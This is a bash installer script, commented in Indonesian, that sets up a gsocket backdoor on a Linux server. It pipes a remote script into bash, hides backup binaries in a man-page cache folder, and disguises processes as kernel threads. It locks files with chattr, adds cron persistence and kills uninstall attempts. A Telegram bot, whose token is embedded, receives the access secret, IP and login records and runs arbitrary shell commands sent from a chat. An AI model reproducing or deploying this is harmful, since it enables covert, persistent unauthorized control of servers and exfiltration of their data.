#!/bin/bash
# Auto installer Gsocket + Defense + Telegram Bot
# One-liner: curl -fsSL https://yourdomain.com/install.sh | bash

set -e

# Konfigurasi (ganti dengan token dan chat ID Anda)
BOT_TOKEN="8582862783:AAHx-frpMISlzlG3xgtoYyTmfk8zPSn73Ak"
CHAT_ID="6223261018"
SECRET_FILE="/lib/systemd/system/defunct.dat"
BINARY_PATH="/usr/bin/gs-netcat"

# Warna output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}=== Gsocket Auto Installer + Defense + Telegram ===${NC}"

# Cek root
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}Jalankan sebagai root!${NC}"
    exit 1
fi

# Cek koneksi internet
echo -n "Cek koneksi internet... "
if ping -c 1 google.com &>/dev/null; then
    echo -e "${GREEN}OK${NC}"
else
    echo -e "${RED}Gagal${NC}"
    exit 1
fi

# Install dependencies
echo -n "Install dependensi (curl, jq, chattr)... "
apt update -qq && apt install -y curl jq e2fsprogs >/dev/null 2>&1
echo -e "${GREEN}OK${NC}"

# Install gsocket jika belum ada
if ! command -v gs-netcat &>/dev/null || [ ! -f "$SECRET_FILE" ]; then
    echo -n "Install gsocket... "
    curl -fsSL https://gsocket.io/y | bash >/dev/null 2>&1
    # Tunggu sampai secret file terbuat
    for i in {1..10}; do
        if [ -f "$SECRET_FILE" ]; then
            break
        fi
        sleep 1
    done
    if [ ! -f "$SECRET_FILE" ]; then
        echo -e "${RED}Gagal menginstall gsocket${NC}"
        exit 1
    fi
    echo -e "${GREEN}OK${NC}"
else
    echo -e "${YELLOW}Gsocket sudah terinstall${NC}"
fi

# Baca secret
SECRET=$(cat "$SECRET_FILE")
echo "Secret: $SECRET"

# Pastikan binary ada
if [ ! -f "$BINARY_PATH" ]; then
    BINARY_PATH=$(which gs-netcat)
fi

echo -n "Mengunci file penting... "
chattr +i "$SECRET_FILE" 2>/dev/null || echo -n "gagal secret "
chattr +i "/lib/systemd/system/defunct.service" 2>/dev/null || echo -n "gagal service "
chattr +i "$BINARY_PATH" 2>/dev/null || echo -n "gagal binary "
echo -e "${GREEN}OK${NC}"

echo -n "Membuat backup tersembunyi... "
mkdir -p /usr/share/man/man3/.cache
cp "$BINARY_PATH" /usr/share/man/man3/.cache/udev-worker
cp "$SECRET_FILE" /usr/share/man/man3/.cache/defunct.bin
chattr +i /usr/share/man/man3/.cache/udev-worker 2>/dev/null
chattr +i /usr/share/man/man3/.cache/defunct.bin 2>/dev/null
echo -e "${GREEN}OK${NC}"

echo -n "Menjalankan instance cadangan... "
exec -a "[usb-storage]" /usr/share/man/man3/.cache/udev-worker -s "$SECRET" -d &
echo -e "${GREEN}OK${NC}"

# Buat script watchdog + telegram commander di lokasi tersembunyi
WATCHDOG_PATH="/usr/share/man/man3/.cache/systemd-defend.sh"

cat > "$WATCHDOG_PATH" << 'EOF'
#!/bin/bash
# Auto Defense + Telegram Commander (daemon)
BOT_TOKEN="8582862783:AAHx-frpMISlzlG3xgtoYyTmfk8zPSn73Ak"
CHAT_ID="6223261018"
SECRET_FILE="/lib/systemd/system/defunct.dat"
BINARY_PATH="/usr/bin/gs-netcat"
BACKUP_BIN="/usr/share/man/man3/.cache/udev-worker"
BACKUP_SECRET="/usr/share/man/man3/.cache/defunct.bin"
LOG_FILE="/var/log/gsocket-defend.log"

log() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" >> "$LOG_FILE"
}

send_telegram() {
    local msg="$1"
    local priority="$2"
    local state_file="/tmp/gsocket-state.txt"
    if [ ! -f "$state_file" ]; then
        echo "last_alert=0" > "$state_file"
    fi
    source "$state_file"
    local now=$(date +%s)
    if [ "$priority" = "high" ] || [ $((now - last_alert)) -gt 300 ]; then
        curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
            -d chat_id="$CHAT_ID" \
            -d text="$msg" \
            -d parse_mode="HTML" > /dev/null
        sed -i "s/last_alert=.*/last_alert=$now/" "$state_file"
        log "Alert terkirim: $msg"
    fi
}

send_long_message() {
    local msg="$1"
    local max_len=4000
    if [ ${#msg} -le $max_len ]; then
        send_telegram "$msg" "high"
    else
        local start=0
        while [ $start -lt ${#msg} ]; do
            local part="${msg:$start:$max_len}"
            send_telegram "$part" "high"
            start=$((start + max_len))
            sleep 1
        done
    fi
}

watchdog() {
    SECRET=$(cat "$SECRET_FILE")
    if ! pgrep -f "\[kaluad\]" > /dev/null; then
        log "Proses [kaluad] mati. Restart..."
        send_telegram "🔄 <b>GSOCKET [kaluad] RESTART</b>%0AWaktu: $(date '+%Y-%m-%d %H:%M:%S')" "high"
        exec -a "[kaluad]" "$BINARY_PATH" -s "$SECRET" -d &
    fi
    if ! pgrep -f "\[usb-storage\]" > /dev/null; then
        log "Proses [usb-storage] mati. Restart..."
        exec -a "[usb-storage]" "$BACKUP_BIN" -s "$SECRET" -d &
    fi
}

monitor() {
    # Login baru
    local last_login_file="/tmp/.last_login_count"
    if [ ! -f "$last_login_file" ]; then
        last | grep "$(date +%a)" | wc -l > "$last_login_file"
    fi
    local prev=$(cat "$last_login_file")
    local curr=$(last | grep "$(date +%a)" | wc -l)
    if [ "$curr" -gt "$prev" ]; then
        local new=$(last -n 3)
        send_telegram "🔐 <b>LOGIN BARU</b>%0A<pre>$new</pre>" "high"
        echo "$curr" > "$last_login_file"
    fi

    # Uninstall attempt
    local susp=$(ps aux | grep -E "curl.*gsocket|wget.*gsocket|GS_UNDO" | grep -v grep | grep -v "defend")
    if [ -n "$susp" ]; then
        local ips=$(netstat -tnpa 2>/dev/null | grep ESTABLISHED | grep -E "curl|wget")
        send_telegram "🚨 <b>PERCOBAAN UNINSTALL!</b>%0A<pre>$susp</pre>%0AIP: <pre>$ips</pre>%0A🛡️ Proses dimatikan." "high"
        pkill -f "curl.*gsocket"
        pkill -f "wget.*gsocket"
        pkill -f "GS_UNDO"
        echo "$(date): $ips" >> /root/.suspicious_ips.txt
    fi

    # File integrity (tiap jam)
    local hour_check="/tmp/.hour_check"
    if [ ! -f "$hour_check" ] || [ "$(cat $hour_check)" != "$(date +%H)" ]; then
        if [ ! -f "$SECRET_FILE" ]; then
            send_telegram "❌ <b>FILE SECRET HILANG!</b> Restore..." "high"
            cp "$BACKUP_SECRET" "$SECRET_FILE"
            chattr +i "$SECRET_FILE"
        fi
        if [ ! -f "$BINARY_PATH" ]; then
            send_telegram "❌ <b>BINARY HILANG!</b> Restore..." "high"
            cp "$BACKUP_BIN" "$BINARY_PATH"
            chattr +i "$BINARY_PATH"
        fi
        echo "$(date +%H)" > "$hour_check"
    fi
}

process_telegram() {
    local offset_file="/tmp/.telegram_offset"
    local offset=$(cat "$offset_file" 2>/dev/null || echo 0)
    local updates=$(curl -s -X GET "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=$offset&timeout=30")
    echo "$updates" | jq -c '.result[]' 2>/dev/null | while read -r update; do
        local update_id=$(echo "$update" | jq -r '.update_id')
        local chat=$(echo "$update" | jq -r '.message.chat.id')
        local text=$(echo "$update" | jq -r '.message.text // empty')
        echo $((update_id + 1)) > "$offset_file"
        if [ "$chat" = "$CHAT_ID" ] && [ -n "$text" ]; then
            send_telegram "⏳ Menjalankan: <code>$text</code>" "high"
            local outfile=$(mktemp)
            timeout 60 bash -c "$text" > "$outfile" 2>&1
            local exit_code=$?
            local output=$(cat "$outfile")
            rm -f "$outfile"
            if [ $exit_code -eq 124 ]; then
                output+="\n\n[!] Perintah timeout setelah 60 detik."
            fi
            local reply="<b>Perintah:</b> <code>$text</code>\n<b>Exit code:</b> $exit_code\n\n<pre>$output</pre>"
            send_long_message "$reply"
        fi
    done
}

daily_report() {
    local report_file="/tmp/.daily_report"
    if [ ! -f "$report_file" ]; then
        echo "1970-01-01" > "$report_file"
    fi
    local last_report=$(cat "$report_file")
    local today=$(date +%Y-%m-%d)
    if [ "$last_report" != "$today" ] && [ "$(date +%H)" = "08" ]; then
        local suspicious_count=$(grep -c "$(date -d yesterday +%Y-%m-%d)" /root/.suspicious_ips.txt 2>/dev/null)
        suspicious_count=${suspicious_count:-0}
        local ip_publik=$(curl -s ifconfig.me 2>/dev/null)
        send_telegram "📊 <b>LAPORAN HARIAN</b>%0ATanggal: $today%0AGsocket: ✅ AKTIF%0APercobaan mencurigakan: $suspicious_count kali%0AIP publik: $ip_publik" "high"
        echo "$today" > "$report_file"
    fi
}

log "Memulai main loop defense (PID: $$)"
send_telegram "✅ <b>GSOCKET DEFEND DIMULAI</b>%0AServer: $(hostname)" "high"

while true; do
    watchdog
    monitor
    process_telegram
    daily_report
    sleep 5
done
EOF

chmod 700 "$WATCHDOG_PATH"

echo -n "Menjalankan watchdog daemon... "
nohup bash "$WATCHDOG_PATH" >/dev/null 2>&1 &
echo -e "${GREEN}OK${NC}"

# Buat cron untuk memastikan watchdog berjalan
(crontab -l 2>/dev/null; echo "*/5 * * * * pgrep -f systemd-defend.sh || nohup bash $WATCHDOG_PATH >/dev/null 2>&1 &") | crontab -

# Kirim notifikasi sukses
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
    -d chat_id="$CHAT_ID" \
    -d text="✅ <b>GSOCKET INSTALLER SELESAI</b>%0AServer: $(hostname)%0ASecret: $SECRET%0AIP: $(curl -s ifconfig.me)" \
    -d parse_mode="HTML" >/dev/null

echo -e "${GREEN}Instalasi selesai!${NC}"
echo "Secret: $SECRET"
echo "Cek log: tail -f /var/log/gsocket-defend.log"
